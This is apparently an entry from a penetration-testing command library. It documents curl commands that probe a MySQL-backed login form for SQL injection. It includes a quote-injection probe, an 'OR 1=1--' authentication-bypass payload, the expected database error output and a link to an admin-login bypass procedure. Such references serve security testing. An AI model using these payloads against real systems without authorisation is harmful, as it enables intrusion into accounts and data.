---
id: 210e7df6-8a83-42bf-b5fd-e4a9a1464a12
name: curl-test-mysql-injection
type: command
executor: bash
data: >-
  curl -X POST http://target.com/login.php -d "username=admin'" -d
  "password=pass" -c cookies.txt
output: null
created_at: '2023-04-06T03:56:34.879125+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
  - Web
tags:
  - sql-injection
  - testing
verified: true
validated: true
---

# curl-test-mysql-injection

## Command

```bash
curl -X POST $_TARGET_URL -d "username=admin'" -d "password=$_PASSWORD" -c $_COOKIE_FILE
```

## Description

This command tests for SQL injection in a MySQL-backed login form by injecting a single quote into the username field, causing a query syntax error if vulnerable.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_URL | Login endpoint URL (e.g., http://target.com/login.php) | Yes |
| $_PASSWORD | Dummy password for the test | No |
| $_COOKIE_FILE | File to save session cookies | Yes |

## Examples

### Basic Usage

```bash
curl -X POST http://target.com/login.php -d "username=admin'" -d "password=pass" -c cookies.txt
```

### Advanced Usage

Add verbose output for debugging:

```bash
curl -v -X POST http://target.com/login.php -d "username=admin' OR 1=1--" -d "password=pass" -c cookies.txt
```

## Expected Output

Error response like:

```
<br /> <b>Warning</b>: mysql_query(): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''admin'' AND password=''pass'' LIMIT 0,1' at line 1 in /var/www/login.php on line 25
Invalid login
```

## Related

- [[procedures/Bypass-Admin-Login-via-MySQL-Injection-and-Truncation]]
- [[commands/curl-admin-truncation-payload]]
